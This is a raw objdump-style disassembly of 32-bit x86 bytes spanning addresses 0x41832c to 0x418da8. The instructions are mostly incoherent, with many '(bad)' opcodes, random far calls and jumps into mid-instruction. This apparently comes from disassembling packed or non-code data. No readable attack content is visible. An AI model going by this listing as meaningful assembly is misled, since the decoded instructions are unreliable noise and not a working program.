  41832c:	mov    al,0x90
  41832e:	(bad)  
  41832f:	sub    BYTE PTR [ebp+0x48902645],cl
  418335:	sub    al,0x3f
  418337:	les    edx,FWORD PTR [edi+eiz*2-0x6981a23c]
  41833e:	outs   dx,BYTE PTR ds:[esi]
  41833f:	in     eax,dx
  418340:	test   eax,0x587fa7c7
  418345:	pop    ecx
  418346:	fwait
  418347:	pop    edx
  418348:	xchg   DWORD PTR [eax+edi*8+0x7d],ecx
  41834c:	lods   al,BYTE PTR ds:[esi]
  41834d:	xchg   ebp,eax
  41834e:	jae    0x418366
  418350:	and    al,BYTE PTR [edi+0x6dd0d29f]
  418356:	mov    ecx,0xcccf0b17
  41835b:	push   es
  41835c:	adc    al,0x2e
  41835e:	xchg   esi,eax
  41835f:	jmp    0x418374
  418361:	aad    0x4c
  418363:	rol    DWORD PTR [ebx],0x52
  418366:	xor    al,0x79
  418368:	adc    edx,DWORD PTR [ecx+ebp*2+0x63]
  41836c:	add    esi,0xae62d13e
  418372:	sub    eax,DWORD PTR [edi]
  418374:	ret    
  418375:	(bad)  
  418376:	fmul   st(4),st
  418378:	or     BYTE PTR [esi-0x73],bh
  41837b:	clc    
  41837c:	data16 mov dl,0x29
  41837f:	pop    edx
  418380:	push   0xb6924e71
  418385:	stos   BYTE PTR es:[edi],al
  418386:	pop    edx
  418387:	jecxz  0x41837c
  418389:	lods   eax,DWORD PTR ds:[esi]
  41838a:	popf   
  41838b:	in     eax,dx
  41838c:	adc    ecx,esp
  41838e:	jle    0x418321
  418390:	bound  eax,QWORD PTR [eax]
	...
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	test   al,0x3b
  418402:	mov    esi,0x100c2c8
  418407:	add    BYTE PTR ds:0xc0000001,al
  41840d:	push   ebx
  41840e:	fcom   QWORD PTR [edi-0x649a289d]
  418414:	push   ebx
  418415:	ins    BYTE PTR es:[edi],dx
  418416:	aas    
  418417:	or     eax,0x1e98938c
  41841c:	jecxz  0x418443
  41841e:	lods   al,BYTE PTR ds:[esi]
  41841f:	test   ch,0xa5
  418422:	leavew 
  418424:	sub    al,BYTE PTR [esp+edx*1-0x57]
  418428:	mov    dh,0xef
  41842a:	sbb    ecx,edi
  41842c:	push   DWORD PTR [esi+0x1]
  41842f:	push   edx
  418430:	adc    ah,BYTE PTR [edx]
  418432:	sub    BYTE PTR [ecx],ch
  418434:	call   0x4ee2:0x3375fa8d
  41843b:	dec    edi
  41843c:	cs test esi,edx
  41843f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418440:	pop    esp
  418441:	sub    ecx,esp
  418443:	aas    
  418444:	push   edi
  418445:	(bad)  
  418446:	imul   ebp,DWORD PTR [edi],0xffffff8a
  418449:	push   ecx
  41844a:	loope  0x4184b4
  41844c:	addr16 repnz (bad) 
  41844f:	fisub  WORD PTR [edx+0x45bdd412]
  418455:	and    al,0x8
  418457:	mov    cl,0x7
  418459:	std    
  41845a:	mov    ah,0x16
  41845c:	test   BYTE PTR [esi-0x6c7edbaf],al
  418462:	xor    BYTE PTR [edx+edx*4-0x50],dh
  418466:	ss or  ecx,DWORD PTR gs:[ebp+0xd]
  41846b:	mov    eax,ds:0xed02b14f
  418470:	sub    BYTE PTR [edi],0xd6
  418473:	xlat   BYTE PTR ds:[ebx]
  418474:	jl     0x4184f2
  418476:	cmp    DWORD PTR [edi-0x3d1dcf37],ecx
  41847c:	iret   
  41847d:	sbb    eax,0x1e2503dd
  418482:	push   esp
  418483:	mov    bl,0x1c
  418485:	call   0x721:0x2d9164e1
  41848c:	pop    edx
  41848d:	lahf   
  41848e:	or     dl,dh
  418490:	int3   
  418491:	das    
  418492:	or     cl,BYTE PTR [esi+eax*2]
  418495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418496:	in     eax,0x95
  418498:	sub    BYTE PTR [eax],0xa1
  41849b:	lds    ebp,FWORD PTR [esi-0x63]
  41849e:	mov    edx,0x3ff03098
  4184a3:	pop    edi
  4184a4:	inc    edx
  4184a5:	sub    eax,DWORD PTR [ecx-0x6c]
  4184a8:	mov    esi,0x70c62aa5
  4184ad:	lea    ecx,[esi-0xf45085d]
  4184b3:	(bad)  
  4184b4:	fnstcw WORD PTR [eax-0x59]
  4184b7:	in     eax,dx
  4184b8:	jge    0x418474
  4184ba:	sti    
  4184bb:	int    0x22
  4184bd:	jecxz  0x4184b4
  4184bf:	pop    edi
  4184c0:	xor    dl,BYTE PTR [ebx-0x51a43a22]
  4184c6:	pop    ss
  4184c7:	or     al,0x9c
  4184c9:	ficomp WORD PTR [ebx-0x52872a47]
  4184cf:	dec    eax
  4184d0:	retf   0x6c3f
  4184d3:	es mov ebp,0x358fb453
  4184d9:	nop
  4184da:	test   BYTE PTR ds:0x65e80b93,cl
  4184e0:	xor    BYTE PTR fs:[ebp+eax*4-0x53],al
  4184e5:	xchg   edi,eax
  4184e6:	sub    al,0xa3
  4184e8:	retf   0xefe
  4184eb:	test   BYTE PTR [esi-0xd5d165],0x5f
  4184f2:	mov    cl,0xfd
  4184f4:	out    0xc1,al
  4184f6:	inc    ecx
  4184f7:	ins    DWORD PTR es:[edi],dx
  4184f8:	scas   al,BYTE PTR es:[edi]
  4184f9:	loope  0x418518
  4184fb:	clc    
  4184fc:	jo     0x41847f
  4184fe:	rcr    edx,1
  418500:	loope  0x41852e
  418502:	sahf   
  418503:	push   ds
  418504:	mov    eax,ds:0x71586823
  418509:	test   bh,al
  41850b:	xor    ch,dh
  41850d:	stc    
  41850e:	or     BYTE PTR [ebp-0x1e],0x0
	...
  418572:	add    BYTE PTR [eax],al
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	mov    bl,0xc8
  418582:	mov    esi,0x101c766
  418587:	add    BYTE PTR ds:0x9e000001,al
  41858d:	mov    dh,0x50
  41858f:	mov    al,0x54
  418591:	fwait
  418592:	ror    DWORD PTR [edx],0x29
  418595:	adc    DWORD PTR [eax-0x5a],0xa465b898
  41859c:	jb     0x418558
  41859e:	or     ch,BYTE PTR [edi-0x7e7b73b9]
  4185a4:	mov    ds:0x44b4c35b,eax
  4185a9:	fwait
  4185aa:	xchg   ecx,eax
  4185ab:	bound  ebx,QWORD PTR [ecx-0x114c5cbd]
  4185b1:	add    eax,0xf89c4c71
  4185b6:	cmp    DWORD PTR [edi],0x7d6e8eba
  4185bc:	mov    edx,0x9fcdd3a
  4185c1:	push   cs
  4185c2:	iret   
  4185c3:	jp     0x41856c
  4185c5:	inc    edx
  4185c6:	ja     0x418608
  4185c8:	int3   
  4185c9:	jle    0x4185b7
  4185cb:	aas    
  4185cc:	lods   al,BYTE PTR ds:[esi]
  4185cd:	xchg   edi,eax
  4185ce:	repnz adc al,0x52
  4185d1:	xchg   esi,eax
  4185d2:	lea    ebp,[edx+0x3227a897]
  4185d8:	jg     0x41859e
  4185da:	push   esp
  4185db:	leave  
  4185dc:	stos   BYTE PTR es:[edi],al
  4185dd:	sti    
  4185de:	out    0x1d,eax
  4185e0:	cmp    WORD PTR [eax-0x51bd47d0],bp
  4185e7:	jae    0x418638
  4185e9:	pop    edx
  4185ea:	jl     0x4185c4
  4185ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ed:	xchg   edx,eax
  4185ee:	adc    DWORD PTR [ebp+0xa],0x7f98f674
  4185f5:	mov    esi,ebx
  4185f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185f8:	sub    DWORD PTR [ecx+0x3222ca48],ecx
  4185fe:	pop    ebx
  418600:	and    BYTE PTR [edi+0x6c],0x62
  418604:	mov    bl,0x84
  418606:	(bad)  
  418608:	push   ebp
  418609:	retf   
  41860a:	jmp    0x418610
  41860c:	mov    dl,0xc7
  41860e:	fcomp  DWORD PTR [ebx-0x7f]
  418611:	push   es
  418612:	es pushf 
  418614:	adc    DWORD PTR [esi+0x7f],ecx
  418617:	enter  0x2f9c,0x3
  41861b:	push   esp
  41861c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41861d:	mov    ?,WORD PTR [eax+0x3f58f598]
  418623:	pop    ecx
  418624:	mov    eax,ds:0x9663207c
  418629:	pop    ebx
  41862a:	lock jmp 0x4185b8
  41862d:	xchg   edi,eax
  41862e:	sub    al,bh
  418630:	mov    ah,0xa1
  418632:	int    0x68
  418634:	ror    DWORD PTR [ebp+0x4efb0935],cl
  41863a:	mov    al,0x98
  41863c:	shl    DWORD PTR [ebx+ecx*8],1
  41863f:	or     al,0xe0
  418641:	test   esi,ecx
  418643:	push   es
  418644:	xchg   ebx,ecx
  418646:	pushf  
  418647:	sub    BYTE PTR [ebx+0x33],0x6
  41864b:	(bad)  
  41864d:	adc    BYTE PTR [edx],ch
  41864f:	sbb    eax,0xd47b0491
  418654:	jo     0x418667
  418656:	and    eax,0x4f69a1ea
  41865b:	xor    BYTE PTR [edx-0x28],bl
  41865e:	aam    0x4e
  418660:	inc    edx
  418661:	pop    es
  418662:	pop    es
  418663:	imul   esi,ebx,0x4cc6719c
  418669:	mov    edi,DWORD PTR [ebx-0x42]
  41866c:	xchg   edi,eax
  41866d:	ins    BYTE PTR es:[edi],dx
  41866e:	stos   DWORD PTR es:[edi],eax
  41866f:	dec    ebx
  418670:	and    BYTE PTR [edx-0x22eb7f88],dl
  418676:	sub    eax,0x49652e6c
  41867b:	push   ss
  41867c:	add    eax,0x3621d3af
  418681:	fist   DWORD PTR [ebp+0x61c61d91]
  418687:	xor    ch,ch
  418689:	add    DWORD PTR [esi],ebp
  41868b:	xor    al,0xdb
  41868d:	mov    bh,BYTE PTR [edi]
  41868f:	fidiv  WORD PTR [esi+0x0]
	...
  4186f2:	add    BYTE PTR [eax],al
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	xor    dl,ch
  418702:	repnz adc esp,ecx
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0x97000001,al
  41870d:	jne    0x4186fb
  41870f:	inc    edi
  418710:	and    BYTE PTR [edi-0x13ec4dd],ah
  418716:	jae    0x41876a
  418718:	pop    ss
  418719:	and    DWORD PTR [esi+0x2f],ebp
  41871c:	stos   BYTE PTR es:[edi],al
  41871d:	ins    BYTE PTR es:[edi],dx
  41871e:	mov    dh,0x2b
  418720:	add    al,BYTE PTR [edi+0x1f]
  418723:	(bad)  
  418724:	aas    
  418725:	(bad)  
  418726:	xor    al,0xdd
  418728:	or     eax,0xc7108537
  41872d:	push   es
  41872e:	push   edi
  41872f:	mov    ch,0xd
  418731:	and    eax,0x67005242
  418736:	in     eax,dx
  418737:	idiv   DWORD PTR [eax+ecx*4]
  41873a:	inc    edx
  41873b:	and    DWORD PTR [edx+0x76],0x38
  41873f:	shl    DWORD PTR [ecx-0x737727c4],cl
  418745:	pop    edx
  418746:	ror    cl,cl
  418748:	cmp    DWORD PTR [eax],eax
  41874a:	mov    bl,BYTE PTR [ecx+eiz*1]
  41874d:	out    dx,eax
  41874e:	out    0xf7,al
  418750:	cli    
  418751:	(bad)  
  418752:	icebp  
  418753:	push   ebx
  418754:	cwde   
  418755:	nop
  418756:	or     al,0x88
  418758:	outs   dx,DWORD PTR ds:[esi]
  418759:	lock adc dl,BYTE PTR [edi-0xa]
  41875d:	rol    DWORD PTR [esi-0x4e757137],0x68
  418764:	sbb    eax,DWORD PTR [ecx-0x1803a814]
  41876a:	mov    dl,0x36
  41876c:	mov    ebp,0xa42dd9ee
  418771:	add    edx,DWORD PTR [edi+0x65]
  418774:	pop    edx
  418775:	addr16 dec eax
  418777:	xchg   edi,eax
  418778:	adc    DWORD PTR [ecx+0x6c6d9b9b],edx
  41877e:	pusha  
  41877f:	sub    DWORD PTR [eax+0x1271831a],ecx
  418785:	test   eax,edx
  418787:	xor    ah,BYTE PTR [ebx+eiz*2]
  41878a:	inc    edi
  41878b:	jl     0x418748
  41878d:	hlt    
  41878e:	mov    ebx,0x75aec8e
  418793:	das    
  418794:	imul   ebx,DWORD PTR [ecx],0x8a00ec19
  41879a:	inc    esi
  41879b:	cs mov dh,0xf5
  41879e:	sbb    bl,ah
  4187a0:	adc    ebp,ebp
  4187a2:	adc    al,0xcc
  4187a4:	in     al,dx
  4187a5:	pusha  
  4187a6:	jg     0x418766
  4187a8:	xlat   BYTE PTR ds:[ebx]
  4187a9:	mov    edi,0x70c5af67
  4187ae:	add    ebx,0x6d5cc121
  4187b4:	cwde   
  4187b5:	or     ebp,DWORD PTR [edi]
  4187b7:	mov    eax,0xb4d4132a
  4187bc:	jl     0x41882d
  4187be:	(bad)  
  4187bf:	fidiv  DWORD PTR [edx-0x29e4415]
  4187c5:	mov    edi,0x7d0c6c34
  4187ca:	push   0xffffff98
  4187cc:	stc    
  4187cd:	jno    0x418829
  4187cf:	fdivr  QWORD PTR [edi]
  4187d1:	adc    eax,0x3f607dbc
  4187d6:	pushf  
  4187d7:	aas    
  4187d8:	jmp    0x1811271
  4187dd:	sbb    DWORD PTR cs:[esi],ebp
  4187e0:	mov    esi,0xff04b8f9
  4187e5:	adc    BYTE PTR [ebp+0x7c],ah
  4187e8:	(bad)  
  4187ea:	aad    0x56
  4187ec:	not    BYTE PTR [edx]
  4187ee:	jb     0x418789
  4187f0:	mov    bl,0xb
  4187f2:	sti    
  4187f3:	mov    al,0x21
  4187f5:	pop    ds
  4187f6:	ins    BYTE PTR es:[edi],dx
  4187f7:	xchg   ecx,eax
  4187f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f9:	inc    ebp
  4187fa:	fadd   DWORD PTR [edx-0x691b66]
  418800:	mov    ds:0xf0bae658,eax
  418805:	xchg   ecx,eax
  418806:	xchg   esp,eax
  418807:	addr16 mov al,ds:0x8e56
  41880b:	adc    DWORD PTR [edx+0x6f],ebp
  41880e:	dec    esi
  41880f:	in     al,0xe6
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi+0x379c3acd]
  418881:	gs cmp esi,eax
  418884:	rol    DWORD PTR [ebx],1
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0x23000001
  41888d:	retf   0x98d
  418890:	ins    DWORD PTR es:[edi],dx
  418891:	fisttp DWORD PTR [edx+0x265a6c46]
  418897:	iret   
  418898:	lea    ebx,[ebx]
  41889a:	cmp    BYTE PTR [ebp-0x7],ch
  41889d:	xchg   DWORD PTR [ecx+ebx*8],edx
  4188a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188a1:	test   BYTE PTR [edx+0x67],dl
  4188a4:	inc    eax
  4188a5:	bound  esp,QWORD PTR [eax-0x71df4d82]
  4188ab:	xor    ah,BYTE PTR [esi-0x3f]
  4188ae:	push   esp
  4188af:	call   0x2870:0x71941962
  4188b6:	pop    ds
  4188b7:	ret    
  4188b8:	cs xchg edx,eax
  4188ba:	sub    ah,dl
  4188bc:	movq   mm2,mm6
  4188bf:	jo     0x41884e
  4188c1:	mov    edi,0xd0185b63
  4188c6:	call   DWORD PTR [ebx-0x66]
  4188c9:	scas   al,BYTE PTR es:[edi]
  4188ca:	sub    BYTE PTR [edi],ch
  4188cc:	or     al,0x68
  4188ce:	cmp    DWORD PTR ds:[ebx+ebp*2],ebp
  4188d2:	adc    DWORD PTR [ebx-0x2599b9af],esi
  4188d8:	test   al,0xa3
  4188da:	xlat   BYTE PTR ds:[ebx]
  4188db:	cmp    al,BYTE PTR [eax]
  4188dd:	jge    0x418947
  4188df:	dec    edx
  4188e0:	mov    edi,0x4c1d8ba1
  4188e5:	fmul   st(4),st
  4188e7:	push   esi
  4188e8:	add    al,0xb
  4188ea:	jb     0x4188c7
  4188ec:	jl     0x418954
  4188ee:	mov    esp,0xf9477fff
  4188f3:	daa    
  4188f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188f5:	or     ch,BYTE PTR ds:0xf56775ae
  4188fb:	add    DWORD PTR [edi],esp
  4188fd:	add    eax,edx
  4188ff:	jl     0x41890b
  418901:	sahf   
  418902:	jmp    0x4188a5
  418904:	and    DWORD PTR [esi+0x2363b883],ebp
  41890a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41890b:	aam    0x60
  41890d:	in     al,dx
  41890e:	aas    
  41890f:	mov    dl,0x69
  418911:	adc    BYTE PTR [ebp-0x47666b4f],0xc0
  418918:	shl    BYTE PTR [ecx],cl
  41891a:	push   esp
  41891b:	aad    0x19
  41891d:	sahf   
  41891e:	les    ebp,FWORD PTR [esi+0x59e966f6]
  418924:	xchg   BYTE PTR [esi+0x22],bh
  418927:	mov    ch,0x1b
  418929:	sub    BYTE PTR [eax-0x477d414c],ch
  41892f:	test   DWORD PTR [edx+ecx*2-0x3e],0x7fcff095
  418937:	dec    esp
  418938:	xor    al,0xe
  41893a:	imul   esp,DWORD PTR [ebx-0x103cfe98],0x43
  418941:	sub    DWORD PTR [ebp+0x6d],eax
  418944:	or     eax,0xdb797021
  418949:	adc    ch,bl
  41894b:	add    DWORD PTR [edx+0x9],0x24
  41894f:	std    
  418950:	in     al,0x3a
  418952:	nop
  418953:	test   BYTE PTR [esi-0x7f5f5cb],dl
  418959:	push   cs
  41895a:	mov    esp,0xaf2c5aa4
  41895f:	sti    
  418960:	push   0x72
  418962:	inc    eax
  418963:	push   es
  418964:	jns    0x41897e
  418966:	jge    0x4188f0
  418968:	inc    esp
  418969:	and    esp,DWORD PTR [eax]
  41896b:	add    ah,BYTE PTR [eax-0x699add76]
  418971:	push   edx
  418972:	fiadd  DWORD PTR [ebx+0x71]
  418975:	jns    0x4188fa
  418977:	idiv   DWORD PTR [eax-0x691114c4]
  41897d:	sub    al,0x7a
  41897f:	in     al,dx
  418980:	fild   DWORD PTR [ebx]
  418982:	loope  0x4189d6
  418984:	lds    ebp,FWORD PTR [ecx]
  418986:	sbb    BYTE PTR [edi+edi*8-0x1c],ch
  41898a:	pusha  
  41898b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41898c:	inc    esi
  41898d:	(bad)  
  41898e:	fsubr  QWORD PTR [esi-0x71]
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xe8990569
  418a03:	dec    eax
  418a04:	(bad)  
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0x1c000001,al
  418a0d:	and    BYTE PTR [edx+eax*8+0x4302c35b],al
  418a14:	leave  
  418a15:	jo     0x4189b7
  418a17:	pop    es
  418a18:	jmp    0xec5623a3
  418a1d:	lock fst QWORD PTR [edx-0x76]
  418a21:	xor    ebx,0x44
  418a24:	cmc    
  418a25:	sbb    eax,0x12b02629
  418a2a:	enter  0x609c,0xb3
  418a2e:	test   DWORD PTR [ecx+0x1d],0xe5ba1e98
  418a35:	dec    edi
  418a36:	idiv   ebx
  418a38:	jge    0x418a66
  418a3a:	ins    DWORD PTR es:[edi],dx
  418a3b:	or     bl,BYTE PTR [esi-0x2f]
  418a3e:	call   0x7bf0:0x386a1405
  418a45:	and    DWORD PTR [edx+ecx*1],0xa82e07cd
  418a4c:	xchg   ecx,eax
  418a4d:	or     ch,BYTE PTR [ecx]
  418a4f:	call   0xcb4fae33
  418a54:	adc    DWORD PTR [di+0x6e81],0x4b
  418a5a:	xchg   DWORD PTR [ebx+0x28],ecx
  418a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a5e:	inc    ecx
  418a5f:	jle    0x418a28
  418a61:	fsub   DWORD PTR [edi+0x5b]
  418a64:	mov    ebp,0xaf9a1a60
  418a69:	les    edx,FWORD PTR ds:0x5ecb7741
  418a6f:	retf   
  418a70:	inc    esi
  418a71:	aad    0x5d
  418a73:	push   es
  418a74:	inc    eax
  418a75:	(bad)  [esi+0x27]
  418a78:	in     eax,dx
  418a79:	test   BYTE PTR [eax+0xc6814f5],al
  418a7f:	jae    0x418af9
  418a81:	xor    BYTE PTR [ebp-0x572baa6d],al
  418a87:	in     eax,0xb5
  418a89:	mov    BYTE PTR [edx+edi*2-0x34],bh
  418a8d:	jnp    0x418ae0
  418a8f:	jmp    0x418a2b
  418a91:	cmp    eax,0x8df79d99
  418a96:	cmc    
  418a97:	retf   
  418a98:	mov    esi,0x9c2372e3
  418a9d:	sub    al,0x76
  418a9f:	xchg   ebp,eax
  418aa0:	xor    bl,BYTE PTR [ecx]
  418aa2:	xor    BYTE PTR [ebx+ecx*2],ah
  418aa5:	arpl   WORD PTR [esp+edx*2+0x71c17bca],di
  418aac:	gs add eax,0x4c808a6b
  418ab2:	jmp    0x418af6
  418ab4:	shl    DWORD PTR [edi+esi*1+0x20],0xed
  418ab9:	fstp   QWORD PTR [ebx-0x6c]
  418abc:	jbe    0x418ad2
  418abe:	test   eax,0x966fdb8b
  418ac3:	inc    ebx
  418ac4:	cs push 0x67
  418ac7:	xchg   esp,eax
  418ac8:	mov    ds:0x4da6e66c,al
  418acd:	push   ds
  418ace:	mov    dl,0x3f
  418ad0:	push   edi
  418ad1:	xchg   ebx,eax
  418ad2:	mov    dl,0xb3
  418ad4:	or     ch,BYTE PTR [edi]
  418ad6:	dec    ebp
  418ad7:	xor    DWORD PTR [edx-0x67cc609b],esi
  418add:	es adc eax,0xfd3d70c7
  418ae3:	cmova  ebx,DWORD PTR [edi+0x5103a8e1]
  418aea:	jge    0x418b31
  418aec:	add    al,0x1f
  418aee:	xchg   edi,eax
  418aef:	(bad)  
  418af0:	int    0x55
  418af2:	dec    esp
  418af3:	(bad)  
  418af4:	in     al,0x8e
  418af6:	imul   edx,esp,0xffffff87
  418af9:	inc    ecx
  418afa:	xor    eax,0x4b58044f
  418aff:	lea    ebx,ds:0xc045f48
  418b05:	sbb    al,0x88
  418b07:	and    al,bh
  418b09:	add    BYTE PTR [ecx],bl
  418b0b:	xchg   ebx,eax
  418b0c:	lds    esi,FWORD PTR [edx]
  418b0e:	inc    edx
  418b0f:	mov    ebp,0x6d
	...
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xba
  418b81:	out    dx,al
  418b82:	mov    bh,0x49
  418b84:	fild   DWORD PTR ds:0x1050001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	mov    dl,bh
  418b8e:	mov    bl,0xb2
  418b90:	retf   
  418b91:	dec    ecx
  418b92:	mov    ebx,0x6c4cb4f7
  418b97:	(bad)  
  418b98:	stc    
  418b99:	and    DWORD PTR [ebp-0x29e79d1d],esi
  418b9f:	mov    edx,0x4296f704
  418ba4:	mov    esi,0x74eee16c
  418ba9:	adc    eax,0xd8acee65
  418bae:	pushf  
  418baf:	pop    ss
  418bb0:	scas   al,BYTE PTR es:[edi]
  418bb1:	jns    0x418be8
  418bb3:	mov    esp,0xc398dfaa
  418bb8:	lds    ebx,FWORD PTR [eax+0x7028ef19]
  418bbe:	jb     0x418b89
  418bc0:	clc    
  418bc1:	xchg   edx,eax
  418bc2:	cmp    eax,DWORD PTR [ebx+0x26c22be3]
  418bc8:	pop    edx
  418bc9:	outs   dx,BYTE PTR ds:[esi]
  418bca:	or     BYTE PTR [ebx+ebx*1-0x7b064085],ch
  418bd1:	loop   0x418bfd
  418bd3:	jl     0x418bf8
  418bd5:	add    ebx,DWORD PTR [eax-0x3b]
  418bd8:	jnp    0x418c30
  418bda:	rcl    cl,1
  418bdc:	lock pushf 
  418bde:	push   ss
  418bdf:	mov    dh,0x7e
  418be1:	mov    edi,0xdc4dc600
  418be6:	(bad)  
  418be7:	mov    ecx,0x24782040
  418bec:	ins    BYTE PTR es:[edi],dx
  418bed:	xchg   edx,eax
  418bee:	test   eax,0x50bcf2c2
  418bf3:	aad    0xa4
  418bf5:	ret    0x376f
  418bf8:	outs   dx,DWORD PTR ds:[esi]
  418bf9:	rol    esi,1
  418bfb:	ret    0xddd
  418bfe:	sti    
  418bff:	out    0x45,eax
  418c01:	and    BYTE PTR [ecx+0x5e],dl
  418c04:	mov    eax,ds:0xbb9fc7b4
  418c09:	out    0xf0,eax
  418c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c0c:	arpl   WORD PTR [esi-0x5b],bp
  418c0f:	out    0xf8,eax
  418c11:	inc    ebx
  418c12:	retf   0x50ae
  418c15:	pop    ebp
  418c16:	inc    ecx
  418c17:	cs test al,0xe7
  418c1a:	or     ah,al
  418c1c:	push   ecx
  418c1d:	adc    al,0xe5
  418c1f:	sub    dl,dl
  418c21:	lock mov ebp,0x5fef6b53
  418c27:	xchg   ecx,eax
  418c28:	inc    esi
  418c29:	mov    ebx,0xd19e092e
  418c2e:	xchg   ebp,eax
  418c2f:	outs   dx,BYTE PTR ds:[esi]
  418c30:	sub    al,0xbe
  418c32:	or     BYTE PTR [ebp+0x4e],0xfc
  418c36:	inc    ebp
  418c37:	ret    
  418c38:	mov    eax,0x95855db
  418c3d:	push   edi
  418c3e:	pushf  
  418c3f:	adc    BYTE PTR [ebx],bl
  418c41:	lea    ebx,[eax+0x5b]
  418c44:	rcr    DWORD PTR [esi+0x32],cl
  418c47:	inc    eax
  418c48:	dec    edi
  418c49:	int3   
  418c4a:	jp     0x418ca2
  418c4c:	pop    ds
  418c4d:	xor    eax,0xa99157f1
  418c52:	or     al,0x6b
  418c54:	sub    ch,bh
  418c56:	mov    dl,0x6a
  418c58:	xor    esi,DWORD PTR [eax-0x49]
  418c5b:	push   ecx
  418c5c:	fs leave 
  418c5e:	pop    esi
  418c5f:	gs clc 
  418c61:	shr    DWORD PTR [ecx+0x5d],cl
  418c64:	es sti 
  418c66:	call   0x8d85521
  418c6b:	mov    ch,0x6
  418c6d:	mov    DWORD PTR [ecx-0x4a],ebp
  418c70:	mov    ebp,0x1a341426
  418c75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c76:	(bad)  
  418c78:	push   0xffffff81
  418c7a:	fwait
  418c7b:	adc    al,0x65
  418c7d:	mov    cl,0x43
  418c7f:	shl    DWORD PTR [esi-0x5b],cl
  418c82:	fsub   st(5),st
  418c84:	ja     0x418c0d
  418c86:	scas   al,BYTE PTR es:[edi]
  418c87:	cmp    edx,eax
  418c89:	not    BYTE PTR [esi-0x27]
  418c8c:	mov    ch,0x3b
  418c8e:	pushf  
  418c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c90:	pop    eax
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shl    BYTE PTR [ecx+0x7b],cl
  418d02:	jecxz  0x418d53
  418d04:	loopne 0x418d0c
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0x65000001
  418d0d:	stos   BYTE PTR es:[edi],al
  418d0e:	mov    ebx,0x78ada154
  418d13:	adc    al,0x25
  418d15:	xchg   ah,al
  418d17:	pop    edx
  418d18:	and    eax,0xab469f71
  418d1d:	sub    DWORD PTR [ebx+ebp*8+0x633fb4db],edi
  418d24:	int    0x2
  418d26:	aam    0x8d
  418d28:	cdq    
  418d29:	adc    dl,BYTE PTR [ebx-0x35f9056b]
  418d2f:	pop    ss
  418d30:	jge    0x418da4
  418d32:	sbb    cl,BYTE PTR [ebp+0x583bb2d3]
  418d38:	test   DWORD PTR [esi],esi
  418d3a:	(bad)  
  418d3b:	sahf   
  418d3c:	stos   BYTE PTR es:[edi],al
  418d3d:	and    esp,esp
  418d3f:	pop    esp
  418d40:	mov    al,0xc5
  418d42:	out    dx,al
  418d43:	cmp    dh,BYTE PTR [esi]
  418d45:	fdivr  DWORD PTR [edi-0xecb0efa]
  418d4c:	and    ebx,eax
  418d4e:	imul   esi,DWORD PTR [esi],0xe8a5dbec
  418d54:	or     BYTE PTR [bp+si+0x49],cl
  418d58:	and    DWORD PTR [ebx],0xffffffc8
  418d5b:	jp     0x418d55
  418d5d:	inc    ebx
  418d5e:	imul   esi,ecx,0xd4545026
  418d64:	mov    ebx,0x9c5a3e33
  418d69:	pop    edi
  418d6a:	rcr    BYTE PTR [ecx+0x69],0x3a
  418d6e:	mov    cl,0x6e
  418d70:	mov    edi,0xec08f4b4
  418d75:	jmp    0x418d00
  418d77:	imul   ecx,DWORD PTR [ebx],0x10
  418d7a:	push   esp
  418d7b:	add    eax,0x3a3f195e
  418d80:	push   ebp
  418d81:	xchg   ebp,eax
  418d82:	mov    esi,0x16d353c
  418d87:	test   DWORD PTR [ecx+0x77],esi
  418d8a:	jno    0x418d90
  418d8c:	mov    al,0xf5
  418d8e:	cmp    al,al
  418d90:	cdq    
  418d91:	repz or dl,BYTE PTR [eax-0x256a9705]
  418d98:	adc    bl,BYTE PTR [esi-0x6a]
  418d9b:	or     DWORD PTR [esi],esp
  418d9d:	xchg   esi,eax
  418d9e:	mov    DWORD PTR [esi+ebp*1],ebx
  418da1:	ss mov eax,0x15f317f1
  418da7:	dec    esp
  418da8:	add    DWORD PTR [edx-0x6854f518],esi
